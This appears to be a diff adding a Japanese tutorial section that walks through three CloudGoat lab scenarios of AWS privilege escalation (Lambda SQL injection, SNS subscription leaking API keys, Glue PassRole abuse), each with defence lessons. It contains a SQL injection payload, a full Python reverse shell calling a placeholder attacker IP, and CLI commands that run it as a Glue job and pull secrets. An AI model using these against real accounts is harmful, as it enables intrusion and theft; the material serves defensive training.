@@ -1,0 +1,327 @@
+## CloudGoatで学ぶサーバレス／権限昇格連鎖
+
+このセクションでは、AWS のインテンショナルに脆弱な検証環境である **CloudGoat**（Rhino Security Labs が公開する「vulnerable by design」なAWS環境を Terraform で自動構築するツール）を題材に、クラウド固有サービス（Lambda・SNS・API Gateway・Glue・Secrets Manager・SSM Parameter Store）が絡む**権限昇格連鎖（privilege escalation chain）**を分解して学ぶ。
+
+ここで扱う3つのシナリオは、いずれも「最初は権限の弱い IAM ユーザーの認証情報しか持っていない攻撃者が、クラウドサービスの設定ミスや IAM ポリシーの過剰権限を足がかりに、段階的に高い権限へと登っていく」という共通構造を持つ。防御側にとって重要なのは、**個々の権限は一見無害でも、それらが連鎖したときに管理者相当まで到達しうる**という「攻撃のグラフ構造」を理解することにある。
+
+> **スコープに関する注意**: 本セクションは防御・検知・設計改善のための理解を目的とする。CloudGoat は自分の AWS アカウント内に自分で構築する練習環境である。実在の第三者サービスや本番環境に対する無許可の検証・破壊的操作は決して行ってはならない。以下のコマンド例は「なぜそれが成立するのか」という原理を理解するためのものであり、そのまま他者の環境に向けてはならない。
+
+用語を最初に整理しておく。
+
+- **IAM（Identity and Access Management）**: AWS の認可の仕組み。「誰が（Principal）」「どのサービスの何を（Action）」「どのリソースに対して（Resource）」できるかを **JSON ポリシー**で定義する。
+- **PassRole（`iam:PassRole`）**: あるサービス（Lambda や Glue など）に対して「この IAM ロールの権限で動け」と**ロールを引き渡す**権限。これがあると、自分自身は持っていない権限でも、ロールを引き渡した先のサービスが代わりに実行してくれる。権限昇格の定番の「橋渡し」になる。
+- **AssumeRole（`sts:AssumeRole`）**: STS（Security Token Service）を通じて、別の IAM ロールになりすまし、そのロールの一時認証情報を得る操作。
+- **Pacu**: これも Rhino 製の、AWS 環境に対する攻撃・列挙（enumeration）フレームワーク。Metasploit の AWS 版のような位置づけで、`sns__enum` のようなモジュールを実行して環境を自動調査する。
+
+---
+
+### 6a-1. Vulnerable Lambda Functions — Lambda のソースコードと presigned URL を突く
+
+最初のシナリオは、「アクセス委譲（access delegation）のために自作した Lambda 関数」を悪用する例である。組織が「ユーザーにポリシーを付与する処理を Lambda 関数に任せる」という設計をしたところ、その Lambda のコードに脆弱性があり、そこから管理者権限まで到達してしまう。
+
+#### 出発点：弱い権限を持つユーザー bilbo
+
+攻撃者は `bilbo` という IAM ユーザーの認証情報を持っている。このユーザーのポリシーは次の2点が肝になる。
+
+- `iam:Get*` と `iam:List*` を `"Resource": "*"` で許可（＝ IAM の**閲覧・列挙が全リソースに対して可能**）
+- `sts:AssumeRole` を `"Resource": "arn:aws:iam::940877411605:role/cg-lambda-invoker*"` で許可（＝ `cg-lambda-invoker` で始まるロールに**なりすませる**）
+
+重要なのは、このユーザーには `iam:PassRole` が**付いていない**点だ。つまり「ロールを Lambda に引き渡して昇格する」という王道の手は使えない。**にもかかわらず昇格できてしまう**のは、後述するように Lambda の**コード自体の脆弱性（SQLインジェクション）**を突くからである。これが本シナリオの教育的な要点で、「PassRole を締めれば安全」という思い込みを崩す。
+
+#### ステップ1：自分の権限を棚卸しする（列挙）
+
+攻撃者はまず「自分は誰で、何ができるのか」を確定させる。`iam:List*`/`iam:Get*` が全許可なので、以下が順番に成立する。
+
+```bash
+# 自分の身元（アカウントID・ユーザーARN）を確認
+aws sts get-caller-identity
+
+# bilbo が所属するグループを調べる
+aws iam list-groups-for-user --user-name bilbo
+
+# グループに紐づくポリシー名を列挙
+aws iam list-group-policies --group-name <group>
+
+# ポリシー本体（Statement）を読む
+aws iam get-policy --policy-arn <arn>
+aws iam get-policy-version --policy-arn <arn> --version-id <v>
+
+# インラインポリシー／アタッチ済みポリシーも確認
+aws iam list-user-policies --user-name bilbo
+aws iam get-user-policy --user-name bilbo --policy-name <name>
+aws iam list-attached-user-policies --user-name bilbo
+```
+
+**なぜこれが可能か**: `iam:Get*`/`iam:List*` を `Resource: "*"` で与えることは、実務では「読み取りだけだから安全」と軽視されがちだ。しかし攻撃者から見れば、これは**環境全体の攻撃経路マップを合法的に手に入れられる**ということを意味する。どのロールが存在し、誰がどのロールに `AssumeRole` できて、どの Lambda が存在するか——すべてが列挙 API 経由で見える。列挙権限の過剰付与は「情報漏えい」ではなく「攻撃の設計図の提供」と捉えるべきである。
+
+#### ステップ2：Lambda 関数のソースコードを丸ごと入手する
+
+このシナリオの核心は、`aws lambda get-function` の応答に含まれる **`Code.Location`** フィールドである。
+
+```bash
+aws lambda get-function --function-name <name>
+```
+
+この応答には、Lambda のデプロイパッケージ（zip）を指す **presigned URL（署名付き URL）** が入っている。presigned URL は「一時的に、認証なしでその S3 オブジェクトにアクセスできる URL」だ。攻撃者はこの URL をブラウザや `curl` で開き、zip を**ダウンロードして展開**するだけで、Lambda の**ソースコード全体（`main.py` や同梱の依存ライブラリ）を読める**。
+
+```bash
+# 応答の Code.Location をコピーしてダウンロード
+curl -o lambda.zip "<presigned-url>"
+unzip lambda.zip
+```
+
+**なぜこれが危険か（仕組みレベル）**: 多くの開発者は「Lambda のコードはクラウド内部にあって外からは見えない」と暗黙に信じている。しかし `lambda:GetFunction` 権限（`iam:Get*` のワイルドカードに含まれうる）さえあれば、AWS は**署名付きの実物 zip へのリンクを返す**。これは設計どおりの挙動で、開発者・CI がコードを取得するための機能だ。つまり Lambda のコードは、`GetFunction` を許した相手にとっては**ホワイトボックス（中身が全部見える状態）**になる。ここに認証情報や SQL 文がハードコードされていれば即座に露出する。
+
+#### ステップ3：Lambda コード内の SQL インジェクションを突く
+
+入手した `main.py` を読むと、ユーザー入力がフィルタリングされずにそのまま SQL 文へ連結されている——古典的な **SQLインジェクション（SQLi: ユーザー入力が SQL 構文として解釈され、開発者の意図しないクエリが実行される脆弱性）** が存在する。攻撃者はソースを読んでいるので、テーブル構造もクエリの形も把握したうえで、この Lambda を（`AssumeRole` で得た `cg-lambda-invoker` 系ロール経由で）呼び出し、注入した入力で**本来なら許可されない IAM 操作（＝自分に管理者ポリシーを付与するなど）を Lambda に代行させる**。
+
+**なぜ昇格が成立するか**: この Lambda は「アクセス委譲」を目的としているため、**Lambda 実行ロール自体が IAM を書き換える強い権限**を持っている。攻撃者本人（bilbo）は IAM の書き込み権限を持たないが、SQLi を通じてこの Lambda に任意の操作をさせられれば、**Lambda の権限で** IAM を書き換えられる。すなわち「弱いユーザー → Lambda 呼び出し → Lambda の強い実行ロール」という**権限の受け渡しが、PassRole ではなくコードの脆弱性を通じて起きている**。結果として攻撃者は管理者相当となり、Secrets Manager にアクセスしてフラグ（機密）を取得できる。
+
+```bash
+# 昇格後：Secrets Manager から機密を取得
+aws --profile bilbo --region us-east-1 secretsmanager list-secrets
+aws --profile bilbo --region us-east-1 secretsmanager get-secret-value --secret-id <ARN>
+```
+
+#### このシナリオの防御教訓
+
+- **アクセス委譲を自作 Lambda で実装しない**。Rhino の記事自身が「Lambda によるアクセス委譲は悪い考えだ。AWS IAM と AWS SSO というネイティブな解がある」と明言している。ロールベースの一時アクセスは AWS SSO（IAM Identity Center）で実現すべきで、独自コードにこの責務を負わせない。
+- **Lambda のコードを本番前にセキュアコードレビューする**。SQLi はパラメータ化クエリ（プレースホルダを使い、入力を「値」としてのみ扱う）で防ぐ。
+- **`lambda:GetFunction` の付与範囲を絞る**。`iam:Get*`/`iam:List*` を `Resource:"*"` で配る運用を見直し、presigned URL 経由でソースが露出しうる前提で権限設計する。
+- **列挙権限を過剰に配らない**。読み取り専用でも、攻撃者にとっては地図になる。
+
+> 出典: CloudGoat goes Serverless: Vulnerable Lambda Functions — https://rhinosecuritylabs.com/cloud-security/cloudgoat-vulnerable-lambda-functions/
+
+---
+
+### 6a-2. sns_secrets — SNS の購読権限から API Gateway の API キーを盗む
+
+2つ目のシナリオは、**メッセージング配信サービス経由での機密漏えい**という、クラウドならではの経路を扱う。全体は「初期認証情報 → IAM/SNS 列挙 → SNS 購読で API キー入手 → API Gateway 認証 → フラグ取得」という3〜4段の連鎖になっている。
+
+#### SNS という攻撃面
+
+**SNS（Simple Notification Service）** は、発行者（publisher）が「トピック（topic）」にメッセージを流すと、そのトピックを**購読（subscribe）**している宛先（Email・SMS・HTTP エンドポイントなど）に**同じメッセージが配信される**、パブリッシュ／サブスクライブ型のマネージド配信サービスである。
+
+このモデルの危険は、**「誰でも購読できてしまう」設定になっていると、トピックに流れる機密メッセージを攻撃者が受信できる**点にある。本シナリオでは、開発者が**デバッグ用のメッセージとして API Gateway の API キーをトピックに流し続けている**（記事によれば5分ごとに配信される）。
+
+#### 出発点の IAM ポリシー
+
+与えられた IAM ユーザーには、次の SNS アクションが許可されている。
+
+- `sns:Subscribe`, `sns:Receive`, `sns:ListSubscriptionsByTopic`, `sns:ListTopics`, `sns:GetTopicAttributes`
+
+API Gateway 側は `apigateway:GET` が許可されているが、`/apikeys`、`/restapis/*/resources/*/methods/`、および統合（integration）エンドポイントに対しては**明示的に Deny**されている。この Deny は「API キーそのものを API 経由では読ませない」ための防御だが、**SNS 経由で漏れる**ため意味をなさない——ここが設計の穴だ。
+
+#### ステップ1：認証情報の設定と身元確認
+
+```bash
+aws configure --profile sns-secrets
+aws sts get-caller-identity --profile sns-secrets
+```
+
+#### ステップ2：自分の権限を確認（CLI 列挙）
+
+```bash
+aws iam list-user-policies --user-name <UserName> --profile sns-secrets
+aws iam get-user-policy --user-name <UserName> --policy-name <PolicyName> --profile sns-secrets
+```
+
+Pacu を使う場合は `iam__enum_permissions` モジュールでインライン／アタッチ済みポリシーから権限を確定できる。
+
+#### ステップ3：SNS トピックを列挙し、購読する（Pacu）
+
+```text
+Pacu > import_keys sns-secrets
+Pacu > run sns__enum --region us-east-1
+Pacu > run sns__subscribe --topics <TopicARN> --email <あなたが受信できるEmail>
+```
+
+- `sns__enum`: 「Simple Notification Service のトピックを列挙・記述する」モジュール。存在するトピックの ARN を洗い出す。
+- `sns__subscribe`: 指定トピックに購読を登録するモジュール。宛先として攻撃者自身が受信できる Email を指定する。
+
+**なぜ機密が届くか（仕組み）**: SNS の購読は、宛先が Email の場合「**確認（confirm subscription）**」のワンステップを踏む。攻撃者は自分の受信箱に届いた確認リンクをクリックして購読を有効化する。以後、トピックに流れる**すべてのメッセージが攻撃者の受信箱に配信される**。開発者がデバッグ目的で API キーを流していれば、それがそのまま平文で届く。記事の表現では「SNS トピックの購読を確認すると、API Gateway の API キーを漏らすメッセージを受け取る」。
+
+つまり `sns:Subscribe` を**トピックを限定せず**に配ってしまうと、そのトピックに流れる情報の機密性は「トピックに何を流すか」だけに依存することになる。**配信内容の機密性と購読の認可が分離されていない**のが根本問題である。
+
+#### ステップ4：API Gateway を特定する
+
+入手した API キーを使う先（REST API とステージ、リソースパス）を探す。
+
+```bash
+aws apigateway get-rest-apis --profile sns-secrets --region us-east-1
+aws apigateway get-stages --rest-api-id <API_ID> --profile sns-secrets
+aws apigateway get-resources --rest-api-id <API_ID> --profile sns-secrets
+```
+
+**API Gateway の用語**: REST API は「API 本体」、**ステージ（stage）**は `prod`/`dev` のようなデプロイ環境の単位、**リソース（resource）**は `/users` のようなパスである。呼び出す URL はこれらを組み立てて作る。
+
+#### ステップ5：API キーを付けて最終エンドポイントを叩き、フラグ取得
+
+```bash
+curl -X GET "https://<API-ID>.execute-api.us-east-1.amazonaws.com/<stageName>/<resourcePath>" \
+  -H "x-api-key: <API-KEY>"
+```
+
+**なぜ `x-api-key` ヘッダなのか**: API Gateway の「API キー」認証は、リクエストの **`x-api-key` HTTP ヘッダ**に鍵文字列を載せる方式で照合される。SNS 経由で盗んだ鍵をこのヘッダに入れれば、正規クライアントとまったく同じ形のリクエストになり、フラグ（保護されたレスポンス）が返る。
+
+#### このシナリオの防御教訓
+
+- **機密（API キー・認証情報）を SNS などのメッセージング経路に絶対に流さない**。デバッグ用でも本番トピックに機密を publish しない。
+- **`sns:Subscribe` を最小権限にする**。トピックを限定せず購読できる状態は、その環境の全トピックの内容を第三者に開く。
+- **SNS メッセージペイロードを暗号化し、API キーを定期ローテーションする**。
+- **機密は Secrets Manager に置く**。配信サービスで運ぶのではなく、認可付きの秘密ストアから取り出す設計にする。
+- **CloudTrail で SNS API・API Gateway アクセスをログ記録**し、不審な `Subscribe` を検知する。
+- **API キーの作成・取得を管理者ロールに限定**する（本シナリオの `/apikeys` Deny はこの発想だが、漏えい経路が別にあると無力になる点に注意）。
+
+> 出典: CloudGoat sns_secrets Walkthrough — https://rhinosecuritylabs.com/research/cloudgoat-sns_secrets/
+
+---
+
+### 6a-3. glue_privesc — SQLi でクレデンシャル窃取 → Glue で任意コード実行 → リバースシェル
+
+3つ目は、**Web アプリの脆弱性（SQLi）とクラウドの権限昇格を橋渡し**する、最も「連鎖」らしいシナリオである。攻撃チェーンは「Web アプリ侵害 → 認証情報窃取 → AWS 権限昇格 → リバースシェル実行 → フラグ取得」の多段構成になる。
+
+#### ステップ1：Web アプリの SQL インジェクションで認証情報を抜く
+
+対象の Web アプリには「フィルタ」ボタンがあり、押すと DB クエリが走る。この POST リクエストの `selected_date` パラメータが**サニタイズされていない**。
+
+**成立するペイロード:**
+
+```text
+selected_date=2023-10-01' UNION SELECT * FROM original_data--
+```
+
+**なぜ抜けるか（仕組み）**: `UNION SELECT` は「元のクエリの結果に、別の SELECT の結果を縦に連結する」SQL 構文である。攻撃者はまず正規の値 `2023-10-01` を書き、続くシングルクォート `'` で文字列リテラルを閉じてクエリ本文に割り込み、`UNION SELECT * FROM original_data` で **`original_data` テーブル全体を結果に混ぜ込む**。末尾の `--` は SQL のコメント開始で、元のクエリの残り（閉じ括弧や `WHERE` 続き）を無効化して構文エラーを避ける。結果として `original_data` の中身がレスポンスに現れ、そこに**平文の AWS 認証情報**が保存されている。
+
+「認証情報を DB に平文で置く」こと自体が重大な設計ミスであり、SQLi と組み合わさって即座にクラウド侵入の入口になる。
+
+#### ステップ2：窃取した認証情報で AWS を列挙
+
+盗んだ認証情報は `glue-manager` という IAM ユーザーのものだった。
+
+```bash
+aws --profile glue-manager sts get-caller-identity
+aws --profile glue-manager iam list-user-policies --user-name <username>
+aws --profile glue-manager iam get-user-policy --user-name <username> --policy-name glue_management_policy
+```
+
+`glue-manager` のインラインポリシーには、**危険な組み合わせ**の権限が入っている。
+
+- `glue:CreateJob`, `glue:StartJobRun`, `glue:UpdateJob`（Glue ジョブの作成・実行・更新）
+- **`iam:PassRole`**（ロールの引き渡し）
+- ワイルドカードの `iam:Get*` / `iam:List*`（全リソースへの列挙）
+
+#### ステップ3：昇格経路の発見 —「PassRole できるロール」を探す
+
+列挙により、`glue-manager` が引き渡せる（そして Glue に背負わせられる）ロール **`s3_to_gluecatalog_lambda_role`** が見つかる。このロールには3つの AWS 管理ポリシーが付いている。
+
+- **AWSLambdaBasicExecutionRole** — CloudWatch Logs への書き込み
+- **AWSGlueConsoleFullAccess** — AWS Glue のフル権限
+- **AmazonS3FullAccess** — 全 S3 バケットへのフルアクセス
+
+**なぜこの組み合わせが致命的か**: `glue-manager` 自身はコード実行能力を持たないが、`glue:CreateJob` + `iam:PassRole` があると、「**このロールで動け**」と `s3_to_gluecatalog_lambda_role` を指定した Glue ジョブを作れる。そして **AWS Glue の Python Shell ジョブは任意の Python コードを実行できる**。すなわち、攻撃者は自分の権限では実行できないコードを、**Glue ジョブという実行エンジン + 引き渡したロールの強い権限**で走らせられる。これが「PassRole + サービスのコード実行機能」による古典的な権限昇格である。
+
+#### ステップ4：リバースシェルを用意し S3 に置く
+
+Glue ジョブに実行させる Python スクリプト（攻撃者インフラへ接続を張り返す**リバースシェル**）を用意する。
+
+```python
+import socket
+import subprocess
+
+HOST = "INSERT IP ADDRESS HERE"   # 攻撃者が待ち受けるIP
+PORT = 6666
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+s.send(b"Connection established")
+
+while True:
+    command = s.recv(1024).decode("utf-8")
+    if command.lower() == "exit":
+        break
+    output = subprocess.getoutput(command)
+    s.send(output.encode("utf-8"))
+
+s.close()
+```
+
+**なぜ「リバース」シェルなのか**: Glue ジョブの実行環境（AWS 管理のコンテナ）へは、攻撃者から直接インバウンド接続できない。そこで**環境側から攻撃者へ接続を張り返す**（reverse）ことで、ファイアウォールやプライベートネットワークの制約を越えてコマンド実行チャネルを確立する。ループ内で `recv` した文字列を `subprocess.getoutput` でシェル実行し、結果を送り返すことで、攻撃者の待ち受けリスナーが対話的シェルになる。
+
+`AmazonS3FullAccess` を持つ（引き渡し先ロールの権限、あるいは `glue-manager` 経由）ため、スクリプトを S3 バケットに置ける。
+
+```bash
+aws --profile glue-manager s3 cp scenarios/glue_privesc/rev.py s3://<bucket-name>/rev.py
+```
+
+#### ステップ5：悪意ある Glue ジョブを作成して実行
+
+```bash
+aws --profile glue-manager glue create-job \
+  --name revshell \
+  --role arn:aws:iam::<ACCOUNT>:role/s3_to_gluecatalog_lambda_role \
+  --command '{"Name":"pythonshell", "PythonVersion": "3", "ScriptLocation":"s3://<bucket>/rev.py"}'
+```
+
+```bash
+aws --region us-east-1 --profile glue-manager glue start-job-run --job-name revshell
+```
+
+`start-job-run` は `JobRunId` を返し、実行が始まったことを示す。
+
+**ポイント**: `--role` に指定しているのが引き渡し先の `s3_to_gluecatalog_lambda_role` であり、`--command` の `"Name":"pythonshell"` が「Python Shell ジョブ（任意 Python 実行）」を意味する。`ScriptLocation` に S3 上のリバースシェルを指すことで、**そのロールの権限で** `rev.py` が走る。ここで `iam:PassRole` が「自分より強いロールをジョブに背負わせる」橋渡しとして効いている。
+
+#### ステップ6：ポストエクスプロイト — さらに別ロールへ、そして SSM でフラグ
+
+リバースシェルが張られた後、シェル内で身元を確認すると、実行主体が **`ssm_parameter_role`**（SSM アクセスを持つロール）になっていることが分かる。
+
+```bash
+aws sts get-caller-identity
+```
+
+このロールは **SSM Parameter Store（設定値や機密を保存するキー・バリューストア）** にアクセスできるため、そこに保存されたフラグ（機密）を取り出せる。記事では最終的な取得コマンドまでは明示されていないが、経路としては `aws ssm get-parameter(s)` 系でパラメータを読むことになる。
+
+> ⚠️ **未取得の資料**: glue_privesc 記事の「最終フラグを取得する正確な SSM コマンド」は原文に明示がありませんでした（記事本文が「SSM パラメータを取得してフラグを得る」とだけ記述）。以下は未取得部分の補足として一般知識に基づく解説です。SSM Parameter Store からの取得は通常、次のように行います。
+
+```bash
+# パラメータ名を列挙し、値（暗号化されていれば復号）を取得
+aws ssm describe-parameters
+aws ssm get-parameters-by-path --path "/" --recursive
+aws ssm get-parameter --name "<param-name>" --with-decryption
+```
+
+`--with-decryption` は SecureString 型（KMS で暗号化されたパラメータ）を復号して返すオプションで、対象ロールが該当 KMS キーの復号権限を持っていれば平文が得られる。
+
+#### このシナリオの防御教訓
+
+- **DB に認証情報を平文で埋め込まない**。秘密は Secrets Manager / SSM SecureString に置き、ローテーションする。
+- **SQLi をパラメータ化クエリで塞ぐ**。入力を SQL 構文としてではなく「値」としてのみバインドする。
+- **`iam:PassRole` を無条件で配らない**。`PassRole` は `Condition`（`iam:PassedToService` など）で「どのサービスに、どのロールを」だけに厳格に限定する。ワイルドカードのロール指定は禁物。
+- **Glue のような「任意コード実行が可能なサービス」への強いロール付与を見直す**。`AWSGlueConsoleFullAccess` + `AmazonS3FullAccess` + `iam:PassRole` の同居は、事実上の任意コード実行＋データ全アクセスを意味する。
+- **ワイルドカードの Action / Resource を避ける**。`iam:Get*`/`iam:List*` の全許可は攻撃経路の地図を渡す。
+- **Glue ジョブの作成・実行を監視し、想定外のスクリプト実行を検知**する（CloudTrail の `CreateJob`/`StartJobRun` を監視）。ネットワーク面ではアウトバウンドを制限し、リバースシェルの外向き接続を困難にする。
+
+> 出典: CloudGoat glue_privesc Walkthrough — https://rhinosecuritylabs.com/cloud-security/cloudgoat-walkthrough-glue_privesc/
+
+---
+
+### 6a-4. 3シナリオを貫く「権限昇格連鎖」の共通原理
+
+最後に、3つのシナリオを横断して見えてくる共通構造を整理する。これがクラウド固有の権限昇格を防御するうえでの本質である。
+
+| 観点 | Vulnerable Lambda | sns_secrets | glue_privesc |
+|---|---|---|---|
+| 初期アクセス | 弱いユーザー bilbo | 制限付き IAM ユーザー | Web アプリの SQLi |
+| 昇格の橋渡し | Lambda コードの SQLi（PassRole 不要） | SNS 購読による機密漏えい | `iam:PassRole` + Glue ジョブ |
+| 悪用したサービス | Lambda / Secrets Manager | SNS / API Gateway | Glue / S3 / SSM |
+| 最終到達点 | 管理者相当 → Secrets Manager | API キー → 保護 API | 別ロール → SSM でフラグ |
+
+共通する教訓は次の4点に集約される。
+
+1. **列挙権限は攻撃の設計図になる**。`iam:List*`/`iam:Get*` の `Resource:"*"` は、3シナリオすべてで「次の一手」を攻撃者に教えている。読み取り専用でも過剰付与は避ける。
+2. **「サービスにロールを背負わせる」機能はコード実行に化ける**。Lambda・Glue のようにコードを実行できるサービスに強いロールが渡ると、`PassRole` あるいはコード脆弱性を通じて、自分の権限を超えた操作が可能になる。**PassRole は最も厳格に絞るべき権限**であり、同時に「PassRole を塞げば安全」ではない（Lambda シナリオが示すとおり、コード脆弱性でも昇格しうる）。
+3. **機密は認可付きの秘密ストアに置き、配信・DB・コードに埋め込まない**。SNS への平文 API キー、DB への平文認証情報が、それぞれ致命的な入口になった。
+4. **連鎖を前提に監視する**。単一のイベント（1回の `Subscribe`、1回の `CreateJob`）は無害に見えても、CloudTrail で連続した異常操作として捉え、`sts:AssumeRole` の連鎖や見慣れないサービスのジョブ作成をアラート対象にする。
+
+CloudGoat の価値は、こうした連鎖を**自分の隔離アカウント内で安全に再現し、防御側の検知・設計を検証できる**ことにある。攻撃手順を暗記するためではなく、「なぜその設定が連鎖を許すのか」を仕組みから理解し、自組織の IAM ポリシー・秘密管理・監視を見直すために使うのが、本セクションの意図である。
